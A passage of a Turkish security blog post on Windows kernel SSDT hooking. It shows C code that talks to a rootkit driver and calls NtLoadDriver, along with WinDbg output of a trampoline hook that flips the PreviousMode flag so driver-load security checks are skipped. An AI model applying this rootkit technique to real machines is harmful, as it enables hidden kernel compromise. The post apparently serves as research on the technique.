+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">HandleDevice</span> <span class="o">=</span> <span class="nf">CreateFile</span><span class="p">(</span><span class="n">DEVICE_NAME</span><span class="p">,</span> <span class="n">GENERIC_WRITE</span> <span class="o">|</span> <span class="n">GENERIC_READ</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="n">INVALID_HANDLE_VALUE</span> <span class="o">==</span> <span class="n">HandleDevice</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed to connect Driver! Error Code: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">GetLastError</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">dwExitCode</span> <span class="o">=</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">goto</span> <span class="n">Exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">BOOLEAN</span> <span class="n">bValue</span> <span class="o">=</span> <span class="n">TRUE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="n">Result</span> <span class="o">=</span> <span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">HandleDevice</span><span class="p">,</span> <span class="n">IOCTL_BYPASS_PREVIOUS_MODE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bValue</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">bValue</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">OutputBytesReturned</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">Result</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed to IOCTL Code!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">dwExitCode</span> <span class="o">=</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">goto</span> <span class="n">Exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>İlk olarak burada, trambolini yerleştirmesi için rootkit ile iletişim kuruyoruz.</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">NTDLL</span> <span class="o">=</span> <span class="nf">GetModuleHandleA</span><span class="p">(</span><span class="s">&#34;ntdll.dll&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="nb">NULL</span> <span class="o">==</span> <span class="n">NTDLL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed to get address of NTDLL!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">dwExitCode</span> <span class="o">=</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">goto</span> <span class="n">Exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;NTDLL: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">NTDLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">_NtLoadDriver</span> <span class="o">=</span> <span class="p">(</span><span class="n">NtLoadDriver</span><span class="p">)</span><span class="nf">GetProcAddress</span><span class="p">(</span><span class="n">NTDLL</span><span class="p">,</span> <span class="s">&#34;NtLoadDriver&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="nb">NULL</span> <span class="o">==</span> <span class="n">_NtLoadDriver</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed to get address of NtLoadDriver!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">dwExitCode</span> <span class="o">=</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">goto</span> <span class="n">Exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;NtLoadDriver: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">_NtLoadDriver</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">Status</span> <span class="o">=</span> <span class="nf">_NtLoadDriver</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DriverServiceName</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="n">Status</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">Status</span> <span class="o">==</span> <span class="mh">0xc000010e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">   <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;The driver is already loaded</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="n">dwExitCode</span> <span class="o">=</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">   <span class="k">goto</span> <span class="n">Exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed to Load Driver! Error Code: 0x%08x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">Status</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">dwExitCode</span> <span class="o">=</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">goto</span> <span class="n">Exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;The driver was installed successfully</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="n">dwExitCode</span> <span class="o">=</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>NTDLL&rsquo;e eriştikten sonra NTDLL&rsquo;den NtLoadDriver&rsquo;ın adresini alıyoruz. Ardından da NtLoadDriver&rsquo;ı çağırıyoruz.</p>
+<h2>Projenin Çalıştırılması<span class="hx-absolute -hx-mt-20" id="projenin-çalıştırılması"></span>
+    <a href="#projenin-%c3%a7al%c4%b1%c5%9ft%c4%b1r%c4%b1lmas%c4%b1" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><p>İlk olarak rootkit&rsquo;i sanal makinede çalıştıralım ve çıktılarımıza bir göz atalım:</p>
+<p><img src="../../../images/posts/ssdt-hooking/img5.png" alt="" loading="lazy" /></p>
+<p>Başarılı bir şekilde SSDT&rsquo;nin ve NtLoadDriver&rsquo;ın adresini aldığımızı görebiliriz. Alınan NtLoadDriver&rsquo;ın adresini kontrol edelim:</p>
+<p><img src="../../../images/posts/ssdt-hooking/img6.png" alt="" loading="lazy" /></p>
+<p>Şimdi ise rootkit&rsquo;te bulunan IoControl fonksiyonuna bir bp ekleyelim ve ardından User-Mode programı çalıştıralım:</p>
+<p><img src="../../../images/posts/ssdt-hooking/img7.png" alt="" loading="lazy" /></p>
+<p>User-mode programı bu esnada trambolin için rootkit ile iletişim kurdu.</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<pre><code>1: kd&gt; uf KernelMode!IoControl
+...
+KernelMode!IoControl&#43;0x6c [C:\Users\bekoo\source\github\SSDT-Hooking\KernelMode\KernelMode\main.c @ 104]:
+  104 fffff803`686c180c 4c8d05dd080000  lea     r8,[KernelMode! ?? ::FNODOBFM::`string&#39; (fffff803`686c20f0)]
+  104 fffff803`686c1813 33d2            xor     edx,edx
+  104 fffff803`686c1815 33c9            xor     ecx,ecx
+  104 fffff803`686c1817 ff154b180000    call    qword ptr [KernelMode!_imp_DbgPrintEx (fffff803`686c3068)]
+  106 fffff803`686c181d 4c8d0db42a0000  lea     r9,[KernelMode!OriginalNtLoadDriver (fffff803`686c42d8)]
+  106 fffff803`686c1824 41b814000000    mov     r8d,14h
+  106 fffff803`686c182a 488d15bffeffff  lea     rdx,[KernelMode!HookedNtLoadDriver (fffff803`686c16f0)]
+  106 fffff803`686c1831 488b0d48280000  mov     rcx,qword ptr [KernelMode!g_NtLoadDriverAddress (fffff803`686c4080)]
+  106 fffff803`686c1838 e803f8ffff      call    KernelMode!HkDetourFunction (fffff803`686c1040)
+  108 fffff803`686c183d 488b442448      mov     rax,qword ptr [rsp&#43;48h]</code></pre><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>Hatırlayalım, burada trambolini yerleştiren kısım <strong>HkDetourFunction</strong> idi, demi? Şimdi bu fonksiyon çalıştıktan sonraki kısma bir bp koyalım ve NtLoadDriver&rsquo;ın son haline bir göz atalım:</p>
+<p><img src="../../../images/posts/ssdt-hooking/img8.png" alt="" loading="lazy" /></p>
+<p>Çıktıdan görüldüğü üzere NtLoadDriver içerisine bir jmp kodu yerleştirilmiş bulunmakta. Artık User-Mode program NtLoadDriver&rsquo;ı çağırdığında akış <strong>HookedNtLoadDriver</strong>&lsquo;a yönlenecek.</p>
+<p>NtLoadDriver&rsquo;a bir bp koyalım ve süreci devam ettirelim:</p>
+<p><img src="../../../images/posts/ssdt-hooking/img9.png" alt="" loading="lazy" /></p>
+<p>Göründüğü gibi, akış NtLoadDriver&rsquo;dan HookedNtLoadDriver&rsquo;a aktarılmış bulunmakta.</p>
+<p>Şimdi ise ChangePreviousMode fonksiyona bir bp koyalım ve PreviousMode bayrağına yaptıklarımıza yakından bakalım:</p>
+<p><img src="../../../images/posts/ssdt-hooking/img10.png" alt="" loading="lazy" /></p>
+<p>rcx&rsquo;in değeri 0 olarak ChangePreviousMode&rsquo;a girdi. KPCR&rsquo;nin alındığı kısma kadar akışı ilerletelim:</p>
+<p><img src="../../../images/posts/ssdt-hooking/img11.png" alt="" loading="lazy" /></p>
+<p>Alınan KPCR adresini kontrol edebiliriz:</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<pre><code>kd&gt; dt _KPCR ffffaf05f3fcd080
+nt!_KPCR
+   &#43;0x000 NtTib            : _NT_TIB
+   &#43;0x000 GdtBase          : 0x00000000`00a00006 _KGDTENTRY64
+   &#43;0x008 TssBase          : 0xffffaf05`f3fcd088 _KTSS64
+   &#43;0x010 UserRsp          : 0xffffaf05`f3fcd088
+   &#43;0x018 Self             : (null) 
+   &#43;0x020 CurrentPrcb      : 0x00000000`06afd6a8 _KPRCB
+   &#43;0x028 LockArray        : 0xfffffe87`0be99c70 _KSPIN_LOCK_QUEUE
+   &#43;0x030 Used_Self        : 0xfffffe87`0be94000 Void
+   &#43;0x038 IdtBase          : 0xfffffe87`0be9a000 _KIDTENTRY64
+   &#43;0x040 Unused           : [2] 0
+   &#43;0x050 Irql             : 0x5c &#39;\&#39;
+   &#43;0x051 SecondLevelCacheAssociativity : 0x9f &#39;&#39;
+   &#43;0x052 ObsoleteNumber   : 0x4 &#39;&#39;
+   &#43;0x053 Fill0            : 0 &#39;&#39;
+   &#43;0x054 Unused0          : [3] 0x40e0a5
+   &#43;0x060 MajorVersion     : 0x9cc0
+   &#43;0x062 MinorVersion     : 0xbe9
+   &#43;0x064 StallScaleFactor : 0xfffffe87
+   &#43;0x068 Unused1          : [3] (null) 
+   &#43;0x080 KernelReserved   : [15] 0x10e
+   &#43;0x0bc SecondLevelCacheSize : 0xffffaf05
+   &#43;0x0c0 HalReserved      : [16] 0x8000000
+   &#43;0x100 Unused2          : 0xe0008
+   &#43;0x108 KdVersionBlock   : 0xffffaf05`f3fcd250 Void
+   &#43;0x110 Unused3          : 0xffffaf05`f3fcd250 Void
+   &#43;0x118 PcrAlign1        : [24] 0xe83afa1a
+   &#43;0x180 Prcb             : _KPRCB</code></pre><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>Artık önemli kısmımıza geldik. PreviousMode bayrağı değiştirilmeden ve değiştirildikten sonraki hallerine bir göz atalım:</p>
+<p><img src="../../../images/posts/ssdt-hooking/img12.png" alt="" loading="lazy" /></p>
+<p>Bayrağı değiştirmeden önce <strong>1</strong> ve değiştirmemizden sonra <strong>0</strong> olduğunu görebiliriz.</p>
+<p>Bayrağı da değiştirdiğimize göre akışı devam ettirelim ve NtLoadDriver&rsquo;da bir duralım:</p>
+<p><img src="../../../images/posts/ssdt-hooking/img13.png" alt="" loading="lazy" /></p>
+<p>Artık NtLoadDriver&rsquo;ın içerisindeyiz. Hızlıca PreviousMode bayrağın kontrol edildiği noktaya gelelim:</p>
+<p><img src="../../../images/posts/ssdt-hooking/img14.png" alt="" loading="lazy" /></p>
+<p>Göründüğü gibi dl register&rsquo;ı 0 değeri aldı. Artık kernel ise bu işlemi bir kernel-mode yetkilisi tarafından yapıldığını algılayarak akışı ona göre devam ettirecek:</p>
+<p><img src="../../../images/posts/ssdt-hooking/img15.png" alt="" loading="lazy" /></p>
+<p>Vee amacımıza ulaştık. Artık güvenlik kontrolleri kısmını atladı ve sürücüyü yüklemeye başlayacak.</p>
+<p>Artık akışı tamamen devam ettirelim ve sonuçları görmek için User-Mode programımıza bakalım:</p>
+<p><img src="../../../images/posts/ssdt-hooking/img16.png" alt="" loading="lazy" /></p>
+<p>Başarılı bir şekilde yüklendiğine dair çıktımızı alıyoruz. Ayrıca sürücünün yüklendiğini Windbg&rsquo;dan da kontrol edebiliriz:</p>
+<p><img src="../../../images/posts/ssdt-hooking/img17.png" alt="" loading="lazy" /></p>
+<h2>Sonuç<span class="hx-absolute -hx-mt-20" id="sonuç"></span>
+    <a href="#sonu%c3%a7" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><p>Arkadaşlar umarım sizler için faydalı bir çalışma olmuştur.</p>
+<p>Esasen burada SSDT Hooking tekniği ile kabaca ne yapıldığını ve NtLoadDriver için araştırmalarımı size paylaşmak istedim. Kafanızda bir soru olursa lütfen benimle iletişim kurmaktan çekinmeyin.</p>
+<p>İyi araştırmalar dilerim efenimmm.</p>
+<h2><strong>References</strong><span class="hx-absolute -hx-mt-20" id="references"></span>
+    <a href="#references" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><ul>
+<li><a href="https://en.wikipedia.org/wiki/System_Service_Descriptor_Table" target="_blank" rel="noopener">Wikipedia- System Service Descriptor Table</a></li>
+<li><a href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/glimpse-into-ssdt-in-windows-x64-kernel" target="_blank" rel="noopener">Red Team Notes - SSDT</a></li>
+<li><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/previousmode" target="_blank" rel="noopener">Microsoft Learn - Previous Mode</a></li>
+</ul>
+
+        </div>
+        
+    <div class="hx-mt-12 hx-mb-8 hx-block hx-text-xs hx-text-gray-500 ltr:hx-text-right rtl:hx-text-left dark:hx-text-gray-400">Last updated on <time datetime="2025-02-22T00:00:00.000Z">Şubat 22, 2025</time></div>
+        
+        <div class="hx-mb-8 hx-flex hx-items-center hx-border-t hx-pt-8 dark:hx-border-neutral-800 contrast-more:hx-border-neutral-400 dark:contrast-more:hx-border-neutral-400 print:hx-hidden"><a
+        href="/tr/blog/syscalls/"
+        title="Windows Kernel&#39;da Systemm Call Mekanızmasını Reverseleme"
+        class="hx-flex hx-max-w-[50%] hx-items-center hx-gap-1 hx-py-4 hx-text-base hx-font-medium hx-text-gray-600 hx-transition-colors [word-break:break-word] hover:hx-text-primary-600 dark:hx-text-gray-300 md:hx-text-lg ltr:hx-pr-4 rtl:hx-pl-4"
+      ><svg class="hx-inline hx-h-5 hx-shrink-0 ltr:hx-rotate-180" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"/></svg>Windows Kernel&#39;da Systemm Call Mekanızmasını Reverseleme</a><a
+        href="/tr/blog/patchguard-analysis-part-4/"
+        title="PatchGuard Analysis - Part 4"
+        class="hx-flex hx-max-w-[50%] hx-items-center hx-gap-1 hx-py-4 hx-text-base hx-font-medium hx-text-gray-600 hx-transition-colors [word-break:break-word] hover:hx-text-primary-600 dark:hx-text-gray-300 md:hx-text-lg ltr:hx-ml-auto ltr:hx-pl-4 ltr:hx-text-right rtl:hx-mr-auto rtl:hx-pr-4 rtl:hx-text-left"
+      >PatchGuard Analysis - Part 4<svg class="hx-inline hx-h-5 hx-shrink-0 rtl:-hx-rotate-180" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"/></svg></a></div>
+        
+      </main>
+    </article>
+  </div>
+
+      <footer class="hextra-footer hx-bg-gray-100 hx-pb-[env(safe-area-inset-bottom)] dark:hx-bg-neutral-900 print:hx-bg-transparent"><div class="hx-mx-auto hx-flex hx-gap-2 hx-py-2 hx-px-4 hx-max-w-screen-xl"><div class="hx-flex hx-justify-items-start ">
+    <button
+      title="Change language"
+      data-state="closed"
+      class="language-switcher hx-h-7 hx-rounded-md hx-px-2 hx-text-left hx-text-xs hx-font-medium hx-text-gray-600 hx-transition-colors dark:hx-text-gray-400 hover:hx-bg-gray-100 hover:hx-text-gray-900 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 hx-grow"
+      type="button"
+      aria-label="Change language"
+    >
+      <div class="hx-flex hx-items-center hx-gap-2 hx-capitalize"><svg height=12 xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"/></svg><span>Turkish</span></div>
+    </button>
+    <ul
+      class="language-options hx-hidden hx-z-20 hx-max-h-64 hx-overflow-auto hx-rounded-md hx-ring-1 hx-ring-black/5 hx-bg-white hx-py-1 hx-text-sm hx-shadow-lg dark:hx-ring-white/20 dark:hx-bg-neutral-800"
+      style="position: fixed; inset: auto auto 0px 0px; margin: 0px; min-width: 100px;"
+    >
+      
+        
+        <li class="hx-flex hx-flex-col">
+          <a
+            href="/blog/ssdt-hooking/"
+            class="hx-text-gray-800 dark:hx-text-gray-100 hover:hx-bg-primary-50 hover:hx-text-primary-600 hover:dark:hx-bg-primary-500/10 hover:dark:hx-text-primary-600 hx-relative hx-cursor-pointer hx-whitespace-nowrap hx-py-1.5 hx-transition-colors ltr:hx-pl-3 ltr:hx-pr-9 rtl:hx-pr-3 rtl:hx-pl-9"
+          >English</a>
+        </li>
+      
+        
+        <li class="hx-flex hx-flex-col">
+          <a
+            href="/tr/blog/ssdt-hooking/"
+            class="hx-text-gray-800 dark:hx-text-gray-100 hover:hx-bg-primary-50 hover:hx-text-primary-600 hover:dark:hx-bg-primary-500/10 hover:dark:hx-text-primary-600 hx-relative hx-cursor-pointer hx-whitespace-nowrap hx-py-1.5 hx-transition-colors ltr:hx-pl-3 ltr:hx-pr-9 rtl:hx-pr-3 rtl:hx-pl-9"
+          >Turkish<span class="hx-absolute hx-inset-y-0 hx-flex hx-items-center ltr:hx-right-3 rtl:hx-left-3"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span></a>
+        </li>
+      </ul>
+  </div><button
+  title="Change theme"
+  data-theme="light"
+  class="theme-toggle hx-group hx-h-7 hx-rounded-md hx-px-2 hx-text-left hx-text-xs hx-font-medium hx-text-gray-600 hx-transition-colors dark:hx-text-gray-400 hover:hx-bg-gray-100 hover:hx-text-gray-900 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50"
+  type="button"
+  aria-label="Change theme"
+>
+  <div class="hx-flex hx-items-center hx-gap-2 hx-capitalize"><svg height=12 class="group-data-[theme=light]:hx-hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"/></svg><span class="group-data-[theme=light]:hx-hidden">Light</span><svg height=12 class="group-data-[theme=dark]:hx-hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"/></svg><span class="group-data-[theme=dark]:hx-hidden">Dark</span></div>
+</button>
+</div><hr class="dark:hx-border-neutral-800" /><div
+      class="hextra-custom-footer hx-max-w-screen-xl hx-pl-[max(env(safe-area-inset-left),1.5rem)] hx-pr-[max(env(safe-area-inset-right),1.5rem)] hx-text-gray-600 dark:hx-text-gray-400"
+    ></div><div
+        class="hx-max-w-screen-xl hx-mx-auto hx-flex hx-justify-center hx-py-12 hx-pl-[max(env(safe-area-inset-left),1.5rem)] hx-pr-[max(env(safe-area-inset-right),1.5rem)] hx-text-gray-600 dark:hx-text-gray-400 md:hx-justify-start"
+      >
+        <div class="hx-flex hx-w-full hx-flex-col hx-items-center sm:hx-items-start"><div class="hx-font-semibold"><a class="hx-flex hx-text-sm hx-items-center hx-gap-1 hx-text-current" target="_blank" rel="noopener noreferrer" title="Hextra GitHub Homepage" href="https://github.com/imfing/hextra">
+    <span>Powered by Hextra<svg height=1em class="hx-inline-block ltr:hx-ml-1 rtl:hx-mr-1 hx-align-[-2.5px]" viewBox="0 0 180 180" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><path fill-rule="evenodd" clip-rule="evenodd" d="m 105.50024,22.224647 c -9.59169,-5.537563 -21.40871,-5.537563 -31.000093,0 L 39.054693,42.689119 C 29.463353,48.226675 23.55484,58.460531 23.55484,69.535642 v 40.928918 c 0,11.07542 5.908513,21.3092 15.499853,26.84652 l 35.445453,20.46446 c 9.591313,5.53732 21.408404,5.53732 31.000094,0 l 35.44507,-20.46446 c 9.59131,-5.53732 15.49985,-15.7711 15.49985,-26.84652 V 69.535642 c 0,-11.075111 -5.90854,-21.308967 -15.49985,-26.846523 z M 34.112797,85.737639 c -1.384445,2.397827 -1.384445,5.352099 0,7.749927 l 24.781554,42.922974 c 1.38437,2.39783 3.942853,3.87496 6.711592,3.87496 h 49.563107 c 2.76905,0 5.3273,-1.47713 6.71144,-3.87496 l 24.78194,-42.922974 c 1.38414,-2.397828 1.38414,-5.3521 0,-7.749927 L 121.88049,42.814746 c -1.38414,-2.397828 -3.94239,-3.874964 -6.71144,-3.874964 H 65.605944 c -2.768739,0 -5.327223,1.477059 -6.711592,3.874964 z" style="stroke-width:0.774993" /></svg></span>
+  </a></div><div class="hx-mt-6 hx-text-xs">© 2024 Hextra Project.</div></div>
+      </div></footer>
+    
+    <script defer src="/js/main.js" integrity=""></script>
+
+
+<script defer src="/lib/flexsearch/flexsearch.bundle.min.0425860527cc9968f9f049421c7a56b39327d475e2e3a8f550416be3a9134327.js" integrity="sha256-BCWGBSfMmWj58ElCHHpWs5Mn1HXi46j1UEFr46kTQyc="></script>
+    <script defer src="/tr.search.js" integrity=""></script>
+
+
+  </body>
+</html>
